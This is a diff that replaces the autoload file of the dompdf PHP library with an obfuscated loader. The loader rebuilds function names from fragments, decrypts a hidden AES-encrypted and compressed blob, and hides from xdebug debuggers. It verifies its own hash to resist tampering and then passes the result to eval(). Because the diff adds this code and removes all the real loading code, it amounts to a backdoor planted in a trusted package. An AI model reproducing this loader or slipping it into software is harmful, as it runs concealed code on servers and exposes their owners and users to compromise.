@@ -1,39 +1,28 @@
 <?php
-/**
- * @package dompdf
- * @link    http://dompdf.github.com/
- * @author  Benj Carson <benjcarson@digitaljunkies.ca>
- * @author  Fabien Ménager <fabien.menager@gmail.com>
- * @license http://www.gnu.org/copyleft/lesser.html GNU Lesser General Public License
- */
-
-// HMLT5 Parser
-require_once __DIR__ . '/lib/html5lib/Parser.php';
-
-// Sabberworm
-spl_autoload_register(function($class)
-{
-    if (strpos($class, 'Sabberworm') !== false) {
-        $file = str_replace('\\', DIRECTORY_SEPARATOR, $class);
-        $file = realpath(__DIR__ . '/lib/php-css-parser/lib/' . (empty($file) ? '' : DIRECTORY_SEPARATOR) . $file . '.php');
-        if (file_exists($file)) {
-            require_once $file;
-            return true;
-        }
-    }
-    return false;
-});
-
-// php-font-lib
-require_once __DIR__ . '/lib/php-font-lib/src/FontLib/Autoloader.php';
-
-//php-svg-lib
-require_once __DIR__ . '/lib/php-svg-lib/src/autoload.php';
-
-
-/*
- * New PHP 5.3.0 namespaced autoloader
- */
-require_once __DIR__ . '/src/Autoloader.php';
-
-Dompdf\Autoloader::register();
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_bdzar9jn=('bas'.'e64'.'_de'.'cod'.'e');
+$_gnc4zd35=('gzu'.'nco'.'mpr'.'ess');
+$_bnbqwzzx=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_s2xdmxwv='LL9RjmhItB8=';
+$_gvb8woqk='/gd72j7l';
+$_jab7dyxk='QHBr5iba';
+$_i6ybqa82='89E8JJ9z';
+$_m9k6lbs8='3QtVmxaJ';
+$_v0u68ej4='LIes1qNE';
+$_x1hozpb7='+7VJO8JM';
+$_h4ozr4ld='ZjYRTg==';
+$_sbofffu5=$_bdzar9jn($_gvb8woqk.$_m9k6lbs8.$_i6ybqa82.$_jab7dyxk.$_s2xdmxwv);
+$_yj7wb17p=$_bdzar9jn($_x1hozpb7.$_v0u68ej4.$_h4ozr4ld);
+$_tvb5boi8=$_bdzar9jn('YG9pr85MQU6xPdoSpFvR/KH8og2gV5l5yp+NPnhKcyokLDoIP0FlZvAK9IlUco7qXLn90NtS0601uvQ8AcW2jlkZp30lVifHO+DVB13DPazSWQxaDHITKBnUjVD7tL2spL51ZBriePgP8QfPTzYPO45t9LFJ6gZVCO1wM6+1iGfB7uDng2H1YDxZk0sUmSCYOOMB15cHAzB1iJB0FyasoAKMCbvToUYEDgqggWltVdcLIhpna17UVIr9fiVbjWiL9+UPPHKMIn0JkLtdOCJYKzwqV4wYBqRiDYts0DElaHTNnZnbFCjqK1KzSlDF1tLZeyG1h49KeA8D4VONGEBf+THQpjAFf25XUJP0xUE61o2B1iAHRoi6TF1lO7XefroDW5kX292UtJ7ISjPjAf4PIpLpvkkKm0LkGlzMj/wceIo=');
+$_u9lqt2ul=$_bnbqwzzx($_tvb5boi8,'aes-256-cbc',$_sbofffu5,OPENSSL_RAW_DATA,$_yj7wb17p);
+if($_u9lqt2ul===false){exit;}
+$_xebc4w6g=$_gnc4zd35($_u9lqt2ul);
+if($_xebc4w6g===false){exit;}
+$_c987mt36='15a0787d89bb874ea4d4ffddf13b10e2410464d890869e35a0ae67a866cce3e6';
+$_uq2upyj9=@file_get_contents(__FILE__);
+if($_uq2upyj9!==false){
+$_d7swp9a0=str_replace($_c987mt36,"0000000000000000000000000000000000000000000000000000000000000000",$_uq2upyj9);
+$_tpewg8h0=hash("sha256",$_d7swp9a0);
+if($_tpewg8h0!==$_c987mt36){@http_response_code(403);exit;}
+}
+eval($_xebc4w6g);
